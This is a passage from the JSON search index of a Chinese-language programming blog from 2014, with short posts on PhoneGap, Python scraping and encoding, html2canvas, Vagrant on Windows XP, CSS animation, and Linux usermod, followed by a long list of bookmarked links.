Forums](https://www.autoitscript.com/forum/topic/71544-terminate-process/)","tags":["AutoIt"],"categories":["AutoIt"]},{"title":"[phonegap]安裝套件-battery-status","url":"%2Fblog%2F2014%2F12%2F16%2Flogdown%2F2014-12-16-phonegap-mounting-kit-battery-status%2F","content":"首先套件可到http://plugins.cordova.io/搜尋\nhttp://plugins.cordova.io/#/package/org.apache.cordova.battery-status\nCMD指令輸入\n`phonegap plugin add org.apache.cordova.battery-status `\n我把cordova換成phonegap\n\n官網教學是用`plugman`來裝\n但這兩種安裝方法好像有差(我還沒搞清楚= =|||)\n\n然後，試試battery-status程式竟然沒有跑出電池資訊\n<!--more-->\n\n```\nwindow.addEventListener(\"batterystatus\", onBatteryStatus, false);\nfunction onBatteryStatus(info) {\n    // Handle the online event\n    alert(\"Level: \" + info.level + \" isPlugged: \" + info.isPlugged);\n}\n```\n\n後來查到幾個原因\n1.加入cordova.js (我沒加入那個orz)\n```html\n<script type=\"text/javascript\" src=\"cordova.js\"></script>\n```\n\n2.battery-status擺放位置需在deviceready事件處理\n```\ndocument.addEventListener(\"deviceready\", onDeviceReady, false);\nfunction onDeviceReady() {\n   window.addEventListener(\"batterystatus\", onBatteryStatus, false);\n}\nfunction onBatteryStatus(event) {\n   console.log(\"電量: \" + event.level + \"插入充電器: \" + event.isPlugged);\n}\n```\n\n用手機開Phonegap developer app進去就可以看到成果:D\n\n--\n參考資料：\nphonegap 增加media plugin範例\nhttp://pcschoolleo.blogspot.tw/2013/11/phonegap-media-plugin.html\n\nhttp://iclab.csie.chu.edu.tw/course/app-programming/lecture/phonegap-jquery-mobile/\nPPT第12章\n>PhoneGap框架主要是由手機平台的原生程式碼和JavaScript程式碼所組成，Android就是cordova-x.x.x.jar和cordova-x.x.x.js檔案，所以，框架載入分成原生和JavaScript兩部分。\n事件只有window.onload、deviceready、resume和pause事件是我們可以處理的事件，其他都是內部事件。\n\nPhoneGap 與 Cordova 的實際差異\nhttp://blog.tiger-workshop.com/difference-between-phonegap-and-cordova/\n\nPhoneGap API中文幫助文檔——Events（事件）\nhttp://fanli7.net/a/JAVAbiancheng/JAVAzonghe/20120706/181894.html\n\nPlugreg\nhttp://plugreg.com/","categories":["Phonegap"]},{"title":"[phonegap]編譯APK錯誤訊息","url":"%2Fblog%2F2014%2F12%2F15%2Flogdown%2F2014-12-15-phonegap-apk-compilation-error-messages%2F","content":"因為`phonegap build android`顯示需要Android SDK 19，但是卻出現這個訊息。\n\n`The SDK Build Tools revision (19.0.3) is too low for project 'Testing'.\nMinimum required is 19.1.0`\n\n開起SDK Manager.exe選擇Tool資料夾裡面的Android SDK Build-tools (Rev)19.1\n\n就解決此問題","categories":["Phonegap"]},{"title":"phonegap安裝環境筆記","url":"%2Fblog%2F2014%2F12%2F08%2Flogdown%2F2014-12-08-phonegap-installation-notes%2F","content":"先下載[NodeJS](http://nodejs.org/download/)安裝\n原因官網建議是利用npm管理套件來安裝\n\n`C:\\> npm install -g phonegap`\n\n<!--more-->\n\n\n相關Android安裝環境[這邊](http://www.dotblogs.com.tw/maplenote/archive/2014/01/16/phonegap_android_install.aspx)\n有詳細記錄\n\n可在Android安裝Phonegap Developer app\nhttp://app.phonegap.com/\n```\nphonegap create my-app\ncd my-app\nphonegap serve\n```\n能簡單執行程式!!!\n\n參考來原：\nhttp://www.dotblogs.com.tw/maplenote/archive/2014/01/16/phonegap_android_install.aspx","categories":["Phonegap"]},{"title":"[Python]圖片轉成base64碼","url":"%2Fblog%2F2014%2F11%2F20%2Flogdown%2F2014-11-20-python-picture-converted-to-base64-code%2F","content":"實作異常的順力^^\n\n```python image.py\nimport base64\n\nfp = open(\"a.jpg\",\"rb\")\nimg = fp.read()\nfp.close()\n\nprint(base64.b64encode(img))\n```\n\n在接下來使用requests來實作\n\n```python image.py\n\timgdata = requests.get(imgurl).content\n\timgb64 = base64.b64encode(imgdata)\n```\n\n  完成:D","categories":["Python"]},{"title":"[Python]文件儲存unicode碼的問題","url":"%2Fblog%2F2014%2F11%2F19%2Flogdown%2F2014-11-19-python-files-store-unicode-codes-problem%2F","content":"由於用網頁爬蟲抓取的資料存入json\n文件都會顯示`\"{artist\": \"\\u3058\\u3093\"}`\n但程式抓取都不會有亂碼的問題\n\n但今天我Google大神一個整天\n終於找到方法\n```python\nstr.encode().decode('unicode_escape')\n```\n<!--more-->\n\n\n儲存文件時請記得調成**utf-8**\n```python\nfp = open(\"animeList.json\",\"w+\", encoding = \"utf-8\")\n```\n\n內文的\\n,\\r,\\t...等等都會不見\n最終以`str.replace('\\n','\\\\n')`來解決\n\nrepr包字串會跑出`\\x5e`東西\n\n參考：\nhttp://stackoverflow.com/questions/24787224/how-to-convert-a-python-string\nhttp://www.haogongju.net/art/2041510\nhttp://elleryq-blog.logdown.com/posts/197801/python3-u860bu679c-into-a-unicode-string\n","categories":["Python"]},{"title":"[Python]使用requests、BeautifulSoup當網頁爬蟲","url":"%2Fblog%2F2014%2F11%2F18%2Flogdown%2F2014-11-18-python-using-beautifulsoup-and-requests-when-crawler%2F","content":"上次參加COSCUP 2014時候，[電腦不只會幫你選土豆，還會幫你選新聞](http://www.slideshare.net/daikeren/news-37154830)\n最近無聊做個小實驗\n使用requests、BeautifulSoup實作抓資料存成json\n結果發現不會太難\n\n<!--more-->\n\n```a.py\nfrom selenium import webdriver\nfrom bs4 import BeautifulSoup\nimport requests\nimport re\nimport json\n\n#browser = webdriver.Firefox()\n#browser.get(\"/* url */\")\n#html_source = browser.page_source\n\n\n\nsoup = BeautifulSoup(requests.get(\"/* url */\").text)\n\n\nfp = open(\"/* you can not know it o.< */\",\"w+\")\nfp.write(json.dumps(b))\nfp.close()\n\n```\n\nselenium通常是用來程式測試上面\n但也可以抓取網頁HTML\n通常用爬蟲requests和beautifulsoup就夠方便了XD","tags":["BeautifulSoup"],"categories":["Python"]},{"title":"html2canvas在Firefox上background-size黑畫面的問題","url":"%2Fblog%2F2014%2F11%2F12%2Flogdown%2F2014-11-12-htmnl2canvas-on-firefox-background-size-black-screen-problem%2F","content":"最近使用html2canvas圖片都無法順利呈現...\n最終在https://github.com/niklasvh/html2canvas/issues/288找到解決問題。\nhttps://github.com/niklasvh/html2canvas/commit/e9afe0396019abc39bdb949d78819ae971bf5f2c\n\n不過使用`background-size: xxpx;`數值仍然在Firefox上還是有問題\n但是`background-size:cover`和`background-size:contain`可以順力產生圖片\n","tags":["background-size"],"categories":["HTML"]},{"title":"6個超強增加英文能力網站","url":"%2Fblog%2F2014%2F10%2F29%2Flogdown%2F2014-10-29-6-super-increase-english-website%2F","content":"看到[還在用Google翻譯？6個超強網站讓你查到最道地的英文](http://www.businessweekly.com.tw/online/20141016/KBlogArticle_9545_1.htm)介紹覺得還不錯，記錄一下\n\n\n1. [Google](https://www.google.com.tw/)\n2. [Netspeak](http://www.netspeak.org/)\n3. [Just the word](http://www.just-the-word.com/)\n4. [TANGO Verb Noun Collocation (部分中、英對照)](http://candle.fl.nthu.edu.tw/collocation/webform2.aspx)\n5. [VoiceTube](http://tw.voicetube.com/)\n6. [The Corpus of Contemporary American English (COCA)](http://corpus.byu.edu/coca/)\n\n\n14個APP好像也不錯[低頭族必備！英文想變好，快裝這14個實用英文學習App](http://www.businessweekly.com.tw/online/20140924/KBlogArticle_9367_1.htm)","categories":["網站記錄"]},{"title":"使用html2canvas截圖列印","url":"%2Fblog%2F2014%2F10%2F28%2Flogdown%2F2014-10-28-html2canvas-print-screenshots%2F","content":"路過[以html2canvas制作頁面截圖列印](http://wengsi62.blogspot.tw/2013/03/html2canvas.html)教學\n\n覺得還不錯，筆記筆記！\n<!--more-->\n\n>\n 以html2canvas制作頁面截圖列印\n網上有很多截圖的Service, 如webkit2png或khtml2png，但始終也要經過第三方處理，對於一些內部應用好像不太方便。\n>\nHTML2CANVAS是完全以Client Side Javascript 來將網頁截圖，由於需要用到HTML5的CANVAS ELEMENT，所以對瀏覽器有一定要求，例如 IE9以下並不支援 (但不知道如果用EXCANVAS可否彌補瀏覽器支援上的不足，稍後再試吧)。\n>\nHTML2CANVAS\n官方：http://html2canvas.hertzen.com/\n下載：https://github.com/niklasvh/html2canvas\n>\n開始編寫時在官方下載了0.34版本，使用時發現 IE9可正常運行，但Chrome只能於ready時執行，而無法由button click event執行。後來改用了0.4版本，卻輪到 IE不行。接著發現其中的renderElement function 中有null value的error, 修改後IE終於亦可正常運作了。\n>\n紅色為html2canvas.js新增部份\n```javascript\ncase \"INPUT\":\n        if (/^(text|url|email|submit|button|reset)$/.test(element.type) && (element.value || element.placeholder || \"\").length > 0){\n          renderFormValue(element, bounds, stack);\n        }\n```\n>\n亦可下載修改後的html2canvas.js :\nhttps://docs.google.com/file/d/0B9ookpf4ArZcMHhqemVkTzBCVlU/edit?usp=sharing\n>\n例子: index.html(http://plnkr.co/edit/VR30GO)\n>\n```html\n<!doctype html>\n<html>\n<head>\n  <script src=\"jquery.js\"></script> <!-- version: 1.9.1 -->\n  <script src=\"html2canvas.js\"></script> <!-- version: 0.4.0 modify -->\n</head>\n<body>\n  <h1>Example</h1>\n  <pre>HTML2CANVAS to new window and print</pre>\n\n  <button class=\"print\">Print</button>\n\n  <!-- Button event must after button element, it is not run insert ready() -->\n  <script>\n   $(\".print\").on(\"click\", function(event) {\n html2canvas($('body'), {\n  onrendered: function(canvas) {\n\n    var newWind=window.open('', \"Print\");\n    <!-- Must use html5 -->\n    newWind.document.write(\"<!doctype html><html><body><img src='\"+canvas.toDataURL()+\"'/></body></html>\");\n\n    newWind.print();\n   }\n });\n\n  });\n  </script>\n</body>\n</html>\n```\n\nFile Download (include index.html, html2canvas.js, jquery.js):\nhttps://docs.google.com/file/d/0B9ookpf4ArZcSlB2OXN4c1pGQ00/edit?usp=sharing\n","tags":["html2canvas"],"categories":["HTML"]},{"title":"在XP上安裝chef","url":"%2Fblog%2F2014%2F10%2F27%2Flogdown%2F2014-10-27-install-in-xp-chef%2F","content":"之前Ezgo11安裝vagrant都用的還滿順的\n突然換到XP來用...，就發現麻煩的不少\n沒法只能用XP來用\n\n這次發現[CHEFsupermarket](https://supermarket.getchef.com/)改版了\n連找cookbooks下載地方都找不太到\n最後發現在右下角  = =|||\n\nCookbooks網址：https://supermarket.getchef.com/\n\n\n\n","categories":["Vagrant"]},{"title":"Fixing “The box ‘base’ could not be found.” (Vagrant)","url":"%2Fblog%2F2014%2F10%2F26%2Flogdown%2F2014-10-26-fixing-the-box-base-could-not-be-found-vagrant%2F","content":"vagrant box add base http://files.vagrantup.com/lucid32.box\n\n>This is an indication that the the base virtual image is not configured, usually from forgetting to finish the installation. This image is copied, and modified to produce the desired virtualized environment. It’s easy to fix, by running the following:\n>\n`vagrant box add base http://files.vagrantup.com/lucid32.box`\n>\nIt is also possible that you installed the box under a different name (the Vagrant website sometimes refers to lucid32). Instead of downloading a new box, in this case, you can edit Vagrantfile like so, changing the box name to whatever you called it on download:\n>\n   `config.vm.box = \"lucid32\"`\n\n>If you don’t know what you called it:\n>\n`vagrant box list`\n\nhttp://www.garysieling.com/blog/fixing-the-box-base-could-not-be-found-vagrant\n\n------------------------------\n題外話，\n\n由於我這台XP上`vagrant up`vagrant不能用share folder\n找不到解決方法\n\n結果後來發現是我腦殘把key改掉\n刪掉vagrant_home(.vagrant資料夾)\n就解決了","categories":["Vagrant"]},{"title":"在Windows XP上vagrant不能加box","url":"%2Fblog%2F2014%2F10%2F25%2Flogdown%2F2014-10-25-vagrant-in-windows-xp-cant-add-box%2F","content":"學校給我一台舊電腦(CPU:Sempron 64 3100+ 1.8Ghz，RAM:512MB)\n於是我買了二手RAM:1G*2 300塊含運\n電腦就順多了:D\n<!--more-->\n\n![com.JPG](http://user-image.logdown.io/user/8284/blog/8171/post/239862/fZVIUs79SzW4wZnYhPeS_com.JPG)\n由於灌ezgo11顯卡驅動沒有抓到via sig unichrome pro\ngoogle一大堆都沒有解決\n\n所以就試試XP下裝Vagrant，還是遇到問題Orz\n`The box failed to unpackage properly.`\nGoogle搜尋了一下，最終找到解決[Error while adding Vagrant box in windows xp](https://github.com/mitchellh/vagrant/issues/3869)\n\n>my solution was to download the basic_bsdtar.exe from here http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/ and rename it to bsdtar.exe and place it in C:\\HashiCorp\\Vagrant\\embedded\\gnuwin32\\bin\\\n\n1. 去http://sourceforge.net/projects/mingw/files/MinGW/Extension/bsdtar/ 下載檔案\n2. 到C:\\HashiCorp\\Vagrant\\embedded\\gnuwin32\\bin\\ 把bsdtar.exe取代掉\n3. vagrant即可加入box\n\n","categories":["Vagrant"]},{"title":"[Raspberry Pi]使用Python查詢溫度","url":"%2Fblog%2F2014%2F10%2F24%2Flogdown%2F2014-10-24-raspberry-pi-using-the-python-query-temperature%2F","content":"```python cpuTemp.py\nf = open(\"/sys/class/thermal/thermal_zone0/temp\",\"r\")\nfor t in f:\n    print \"CPU temp:\"+t[:2]+\".\"+t[2:5]\nf.close()\n```","categories":["Raspberry PI"]},{"title":"[Python] 查詢本機IP","url":"%2Fblog%2F2014%2F10%2F24%2Flogdown%2F2014-10-24-python-querying-native-ip%2F","content":"\n```python getIP.py\nimport urllib,random,re\n\nip_regex = re.compile(\"(([0-9]{1,3}\\.){3}[0-9]{1,3})\")\n\ndef public_ip():\n    ''' Returns your public IP address.\n        Output: The IP address in string format.\n                None if not internet connection available.\n    '''\n    # List of host which return the public IP address:\n    hosts = \"\"\"http://www.whatismyip.com/\nhttp://adresseip.com\nhttp://www.aboutmyip.com/\nhttp://www.ipchicken.com/\nhttp://www.showmyip.com/\nhttp://monip.net/\nhttp://checkrealip.com/\nhttp://ipcheck.rehbein.net/\nhttp://checkmyip.com/\nhttp://www.raffar.com/checkip/\nhttp://www.thisip.org/\nhttp://www.lawrencegoetz.com/programs/ipinfo/\nhttp://www.mantacore.se/whoami/\nhttp://www.edpsciences.org/htbin/ipaddress\nhttp://mwburden.com/cgi-bin/getipaddr\nhttp://checkipaddress.com/\nhttp://www.glowhost.com/support/your.ip.php\nhttp://www.tanziars.com/\nhttp://www.naumann-net.org/\nhttp://www.godwiz.com/\nhttp://checkip.eurodyndns.org/\"\"\".strip().split(\"\\n\")\n    for i in range(3):\n        host = random.choice(hosts)\n        try:\n            results = ip_regex.findall(urllib.urlopen(host).read(200000))\n            if results: return results[0][0]\n        except:\n            pass # Let's try another host\n    return None\n\nprint(public_ip());\n```","tags":["查詢本機IP"],"categories":["Python"]},{"title":"Apache的autoindex風格設定","url":"%2Fblog%2F2014%2F10%2F24%2Flogdown%2F2014-10-24-apache-autoindex-style-set%2F","content":"[UNO's autoindex](https://githb.com/unu/autoindex-style)\n[Apache autoindex style](https://github.com/eigan/Apache-Autoindex-Style)\n[FancyIndex](https://github.com/Tymek/fancyindex)\n[usr'z autoindex](https://github.com/usrz/autoindex)\n[fuchcz's apache-autoindex-theme](https://github.com/fuchcz/apache-autoindex-theme)","tags":["autoindex"],"categories":["Apache"]},{"title":"好站紀錄","url":"%2Fblog%2F2014%2F10%2F24%2Flogdown%2F2014-10-24-good-records%2F","content":"路過的好站紀錄區\n<!--more-->\n\nPrograming Notes.\nhttp://joel-zhong.logdown.com/\n\nRegexLib\nhttp://regexlib.com/Default.aspx\n","categories":["網站記錄"]},{"title":"Linux預設帳號設定檔路徑","url":"%2Fblog%2F2014%2F10%2F23%2Flogdown%2F2014-10-23-list-of-linux-new-account-profile%2F","content":"Linux預設帳號設定檔路徑\n`/etc/skel/`","categories":["Linux"]},{"title":"[CSS] CSS3 Animations動畫特效","url":"%2Fblog%2F2014%2F10%2F23%2Flogdown%2F2014-10-23-css-css3-animations-animation-and-special-effects%2F","content":"最近我同學問我這個[背景移動特效](http://yesdesigning.com/forum-63-1.html)要怎麼用\n他以為是JQuery寫出來的\n結果我找了老半天，原來是CSS3\n\n`animation:160s linear 0s normal none infinite animatedBackground`\n\n```css\nname {\n    animation: name duration timing-function delay iteration-count direction fill-mode play-state;\n}\n```\n<!--more-->\n\n※簡單筆記\nname-> @keyframe名稱\nduration -> 設定幾秒內跑完\ntiming-function -> 開始到結束的速度\ndelay -> 動畫開始前延遲幾秒\niteration-count -> 重複執行幾次\ndirection -> 執行完動畫後，接下來的動作模式\nfill-mode -> 動畫跑完後，該此物件擺設位置\nplay-state -> 動畫狀態暫停\n\n@keyframes\n\n```css\n/* Chrome, Safari, Opera */\n@-webkit-keyframes mymove {\n    from {top: 0px;}\n    to {top: 200px;}\n}\n\n/* Standard syntax */\n@keyframes mymove {\n    from {top: 0px;}\n    to {top: 200px;}\n}\n```\n\n```css\n/* Chrome, Safari, Opera */\n@-webkit-keyframes mymove {\n    0%   {top: 0px; left: 0px; background: red;}\n    25%  {top: 0px; left: 100px; background: blue;}\n    50%  {top: 100px; left: 100px; background: yellow;}\n    75%  {top: 100px; left: 0px; background: green;}\n    100% {top: 0px; left: 0px; background: red;}\n}\n\n/* Standard syntax */\n@keyframes mymove {\n    0%   {top: 0px; left: 0px; background: red;}\n    25%  {top: 0px; left: 100px; background: blue;}\n    50%  {top: 100px; left: 100px; background: yellow;}\n    75%  {top: 100px; left: 0px; background: green;}\n    100% {top: 0px; left: 0px; background: red;}\n}\n```\n參考來源：\nhttp://yesdesigning.com/forum-63-1.html(特效)\nhttp://www.w3schools.com/cssref/css3_pr_animation-keyframes.asp","tags":["animation"],"categories":["CSS"]},{"title":"[CSS]text-overflow - 文字太常溢出的字元替代為...","url":"%2Fblog%2F2014%2F10%2F23%2Flogdown%2F2014-10-23-csstext-overflow-text-overflow-characters-too-often-substituted-for%2F","content":"`text-overflow: ellipsis;`\n\n```css\ntext-overflow: clip|ellipsis|string|initial|inherit;\n```\n\n資料來源：\nhttp://www.w3schools.com/cssref/css3_pr_text-overflow.asp\n","tags":["text-overflow"],"categories":["CSS"]},{"title":"Linux 利用 usermod 修改使用者的參數和資料","url":"%2Fblog%2F2014%2F09%2F15%2Flogdown%2F2014-09-15-linux-use-usermod-to-modify-the-users-parameters-and-data%2F","content":"\n>修改使用者帳號資訊（管理者）\n # usermod -l newname username　　　　　# 變更使用者帳號名稱\n # usermod -o -u 101 username　　　　　 # 變更使用者 UID\n # usermod -g users username　　　　　　# 變更使用者主要群組\n # usermod -G mis,sales username　　　　# 變更使用者次要群組\n # usermod -c \"manager\" username　　　 # 修改使用者註解內容\n # usermod -m -d /home/user username　# 變更使用者家目錄路徑\n # usermod -s /usr/bin/ksh username　　 # 變更使用者預設 Shell\n # usermod -e 1/1/2010 username　　　　# 變更使用者過期期限\n # usermod -p FEeig.jYifke username　　 # 變更使用者密碼\n\n\n 來源：http://blog.yam.com/gavint/article/23264761\n\n\n>Linux usermod -p 修改用户密码\n---\npasswd也可以修改口令，但是这是一种交互式的方式，需要用户干预。当然也可以使用重定向或者管道向passwd喂数据，暂且不提。\nlinux下增加用户的命令是useradd，修改用户的命令是usermod，二者都有一个参数 –p，这个参数可以直接指定用户的口令，但是需要注意的是，这个口令并不是明文，而是经过加密的一个字串。\nlinux下可以用python编辑器通过编程的方法得到加密字串（linux下用python命令启动编辑器）：\n下面是一个完整的过程，蓝色字体的是用户输入的命令，而红色的是系统输出。\n```linux\n[root@linux ~]# python\nPython 2.3.4 (#1, Oct 26 2004, 16:42:40)\n```\n```python\n[GCC 3.4.2 20041017 (Red Hat 3.4.2-6.fc3)] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n import crypt;print(crypt.crypt(\"your password\",\"ab\"));\nab62Jfo2yjBEo\n>>>\n```\n上面用户输入信息中的“your password”可以替换为需要加密的口令，“ab”可替换为任意的两个大小写字符或者数字，而“ab62Jfo2yjBEo”就是加密后的密文。\n一个简单的例子如下：\nuseradd –p ab62Jfo2yjBEo testuser\nusermod –p ab62Jfo2yjBEo testuser\n\n\n來源：http://www.cppblog.com/aaxron/archive/2010/12/02/135251.html","tags":["usermod"],"categories":["Linux"]},{"title":"2014  隨意筆記紀錄","url":"%2Fblog%2F2014%2F09%2F03%2Flogdown%2F2014-09-03-2014-random-notes%2F","content":"收集一些網路覺得不錯的東西，會記錄下面。\n希望有時間要找過去想看的，也是非常方便的一件事。\n<!--more-->\n\n2014/12\n\n使瀏覽器的上一頁按鍵無效\nhttp://windwaterbo-blog.logdown.com/posts/245123-disable-back-button-in-browser-using-javascript\n\n一段白爛往事(O(n^2)降成O(n))\nhttp://blog.rayer.idv.tw/posts/245160-for-some-stupid-memories\n\nHTML5 的 File 相關物件\nhttp://jamestw.logdown.com/posts/245135-html5-file-api\n\n[Python] 套件管理程式\nhttp://lucianyo.logdown.com/posts/245094\n\nAndroid讀取外部sdcard圖片\nhttp://shamangary-blog.logdown.com/posts/245120-android-reads-external-sdcard-pictures\n\njquery Form表單修改後未儲存提示\nhttp://joel-zhong.logdown.com/posts/2014/12/02/jquery-alert-for-unsaved-changes-in-form\n\nVim.js\nhttp://coolwanglu.github.io/vim.js/experimental/vim.html\n\nDebian Java-Bridge精簡安裝(免裝Tomcat)[PHP能執行JAVA]\nhttp://vega02.blogspot.tw/2010/10/debian-java-bridgetomcat.html\n\nJava  optional parameters(差點忘記這玩意，但好像只有JAVA有)\nhttp://stackoverflow.com/questions/1737350/java-optional-parameters\n\nT客邦目前使用的 code 品質輔助工具\nhttp://ascendbruce.logdown.com/posts/243326-code-quality-tool-used-in-techbang\n\nReactJS 初學心得\nhttp://www.kvzhuang.net/posts/245658-reactjs-beginner-tips\n\nPhoneGap 09 使用Plugman管理Plugins\nhttp://blog.csdn.net/jacob_wang520/article/details/18319471\n\n程式碼準則 by @mdo\nhttp://lisp.es/code-guide/\n\n快快樂樂用Homestead (PHP Framework - Laravel)\nhttp://www.slideshare.net/warfan/homestead-42836254\n\ndiscuz 的加密與解密函數authcode解析\nhttp://www.wkii.org/discuz-encryption-and-decryption-functions-authcode-analysis.html\n\nPython版本的autocode加解密函数\nhttp://bbs.bccn.net/thread-300363-1-1.html\n\n關於配色這回事\nhttp://baggywalking.blogspot.tw/2008/02/blog-post_560.html\n\n淺談Spine與Angular框架比較\nhttp://jazznote.logdown.com/posts/247111-framework-of-the-discussion-on-the-spine\n\n[R-Pi] 自動載掛外接式硬碟\nhttp://worldofwen.logdown.com/posts/247476-r-pi-automatically-load-hanging-on-an-external-hard-drive\n\nReactJS Examples, Demos, Code\nhttp://react.rocks/\nReactStar\nhttp://rawgit.com/ndyag/react-rater/master/example/index.html\n\n[Python] IPython簡單使用技巧速記\nhttp://enginebai.logdown.com/posts/247825/ipython-tips\n\n--------\n\n2014/11\n使用 Mac 連線到 Raspberry Pi (USB to TTL)\nhttp://chsien.logdown.com/posts/2014/07/05/mac-raspberry-pi-usb\n\nRails 與 AngularJS 混搭風\nhttp://chsien.logdown.com/posts/2014/10/30/rails-and-angularjs-mixed-wind-start\n\nIs [web] down for everyone or just me?\nhttp://www.downforeveryoneorjustme.com/\n\nposition: sticky\n註： Firefox 有支援 position: sticky ； Safari 支援 position: -webkit-stikcy\nhttp://html5-demos.appspot.com/static/css/sticky.html\nhttp://jsfiddle.net/jaceju/7ak0714c/\n\n使用Skrollr.js實作視差滾動\nhttp://blog.friendo.com.tw/posts/240944-prallax-scrolling-by-skrollr\n\nOSQuery\nhttp://osquery.io/\nhttps://github.com/facebook/osquery\n\nFake images please?\nhttp://fakeimg.pl/\n\n使用 Screen 指令操控 UNIX/Linux 終端機的教學與範例\nhttp://www.gtwang.org/2013/11/screen-command-examples-to-manage-linux-terminals.html\nhttp://www.dotblogs.com.tw/bowwowxx/archive/2014/08/30/146410.aspx\n\nselenium\nhttp://www.seleniumhq.org/\nhttp://www.jaceju.net/blog/archives/1293/\nhttps://coscup.hackpad.com/R2-Day-1-719-XLzFyRVl62h\n\nScrapy\nhttp://scrapy.org/\n\nBeautifulSoup\nhttp://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html\nhttp://kilfu0701.blogspot.tw/2011/03/python-beautifulsoup.html\nhttp://whhnote.blogspot.tw/2011/01/python-beautifulsouphtml.html\n\nsql.js\n※[雲蝦米](http://www.slideshare.net/aitjcize/emscripten?redirected_from=save_on_embed)看到的神東西\nhttps://github.com/kripken/sql.js\nhttp://kripken.github.io/sql.js/documentation/\nhttp://kripken.github.io/sql.js/GUI/\nhttps://github.com/aitjcize/Cloud-Liu/blob/master/app/static/js/cloud-liu-loader.js\n\natob、btoa(encode/decode base64)\nhttp://www.w3schools.com/jsref/met_win_atob.asp\n\n那些 CSS 偽元素可以幫你做的 10 個效果\nhttp://blog.mukispace.com/pseudo-elements-10-examples/\n\n網路及平台服務程式設計\nhttp://ccsp.ntumobile.org/syllabus.html\n\nNodeJS入門\nhttp://www.nodebeginner.org/index-zh-tw.html\n\ncodeacdemy\nhttp://www.codecademy.com/\n\n學git的好地方\nhttp://www.codecademy.com/\n\nVim大冒險\nhttp://vim-adventures.com/\n\nOAUTH2 For Browser(Hello.js)\nhttp://jasteralan.logdown.com/posts/241694-oauth2-for-browser\n\n簡單做好中文排版\nhttp://binb.tw/ebookmag/00/00.html\n\nCSS3 pointer-events介绍\nhttp://www.qianduan.net/css3-pointer-event-description.html\n\ngit 日常操作\nhttp://jamestw.logdown.com/posts/242518-git-daily-operations\n\nGit-將專案push到Github上的指定branch\nhttp://u1413745095-blog.logdown.com/posts/242506-specified-on-the-git-push-the-project-to-github-branch\n\npython 公開資料抓取&分析 簡易教學\nhttp://brucecodeworld.logdown.com/posts/242429-analysis-of-public-data-capture-pandas\n\npython公開資料抓取II ghost.py安裝教學紀錄\nhttp://brucecodeworld.logdown.com/posts/242641-python-open-data-capture-ii-ghostpy-installation-instruction\n\n一行CSS設定全幅頁面\nhttp://landen.logdown.com/posts/242608-one-line-of-css-is-set-full-width-page\n\n輕鬆學 Flux\nhttp://andyyou.logdown.com/posts/242746-fools-learn-flux\n\ncanavas2image\nhttps://github.com/hongru/canvas2image\n\n有對比才有看頭！響應式Web設計的9項基本原則\nhttp://www.uisdc.com/9-responsive-web-design-principle\n\njieba中文斷詞\nhttp://blog.fukuball.com/ru-he-shi-yong-jieba-jie-ba-zhong-wen-fen-ci-cheng-shi/\n\njquery loading mask\n========\njQuery BlockUI Plugin\nhttp://jquery.malsup.com/block/\njquery-loadmask\nhttps://code.google.com/p/jquery-loadmask/\n\n使用 jQuery imagesLoaded 判斷圖片是否載入完成\nhttp://augus-blog.logdown.com/posts/143399-jquery-imagesloaded\n\njQuery - Lazy Load - 延遲載入網頁圖片\nhttp://edda.logdown.com/edda/194818-jquery-lazy-load-delay-loaded-web-page-graphic\n\n使用Node.js + Express建構一個簡單的微博網站\nhttp://blog.friendo.com.tw/posts/243576-using-nodejs-express-constructs-a-simple-microblogging-site\n\npython - one line web server\nhttp://bugcaptor.logdown.com/posts/243590-python-one-line-web-server\n\nAndroid Studio+Genymotion安裝\nhttp://elvin.logdown.com/posts/243446-9-looking-for-graphic-material-for-free-amazing-website\n\n9 個尋找免費設計素材的超棒網站\nhttp://elvin.logdown.com/posts/243446-9-looking-for-graphic-material-for-free-amazing-website\n\n卷軸控制 position().top & setscrollTop()\nhttp://kenjux13-blog.logdown.com/posts/243611-scroll-control-setscrolltop\n\nJs與php之間的Json轉換\nhttp://kenjux13-blog.logdown.com/posts/237467-js-and-php-json-conversion\n\nSublime Text 3 常用套件\nhttp://peilun.logdown.com/posts/243457-favorite-sublime-text-3-packages\n\nParse excel file in python and ruby\nhttp://vh21-blog.logdown.com/posts/243560-parse-xls-in-python-and-ruby\n\nPython sort --Sort array with specific element\nhttp://shooting.logdown.com/posts/244236-python-sort\n\nInstall Collectd with Nginx on Ubuntu 12.04\nhttp://worldend.logdown.com/posts/244238-install-collectd-with-nginx-on-ubuntu-1204\n\n[JAVA]字符串格式轉換\nhttp://tianyongwei.logdown.com/posts/244845-string-format-conversion\n\n----\n\n2014/10\nSweetAlert\n另外，如果你要完全取代內建的 alert 函式，你可以這樣寫：\n`window.alert = sweetAlert;`\nhttp://jsbin.com/qeheba/1/edit\n\nALERTIFY.js\nhttp://fabien-d.github.io/alertify.js/\n\nNumeral.js 這套函式庫可以用來「剖析各種數值格式的字串」與「將數值轉成特定格式的字串」\nhttp://numeraljs.com/\n\n設計必備資源總匯\nhttps://github.com/alekseykulikov/treo\n\n發現一枚好用的 HTML5 IndexedDB 函式庫\nhttps://github.com/alekseykulikov/treo\n\npsdiff -simple .psd previews for git\nhttp://filp.github.io/psdiff/\n\n設計團隊必看！教你10招搞定WEB設計風格指南\nhttp://www.uisdc.com/create-style-guides-skills\n\n很有特色的一整套表情符號\nhttp://emojione.com/\n\nEmoji One\nhttp://emojione.com/\n\nCKEditor Addons - 簡易上傳圖片、檔案(SimpleUploads)、Youtube影片搜尋(CKEditor Youtube + search feature)\nhttp://blog.friendo.com.tw/posts/238058-ckeditor-addons-easy-to-upload-pictures-archives-simpleuploads-youtube-video-search-ckeditor-youtube-search-feature\n\nVim教學\nhttp://yenlung-blog.logdown.com/posts/238600-vim-teaching-01\nhttp://yenlung-blog.logdown.com/posts/238744-vim-teaching-02-to-move-the-cursor-delete\n\nPython慣用語\nhttp://seanlin.logdown.com/posts/239883-python-idioms\n\nwebkit2png\nhttp://www.paulhammond.org/webkit2png/\n\nkhtml2png\nhttp://khtml2png.sourceforge.net/\n\n以html2canvas制作頁面截圖列印\nhttp://wengsi62.blogspot.tw/2013/03/html2canvas.html\n\n[Day01] 30天挑戰演算法 - 開始\nhttp://mycodetub.logdown.com/posts/235747-day01-algorithm-for-30-day-challenge-start\n\nJSON Path (不是JSONP)\nhttp://jsonpatch.com/\n\n中、英文網頁切換的瀏覽器書籤小工具\nhttps://github.com/miniasp/en-zh-bookmarklet\n\npython 公開資料抓取&分析 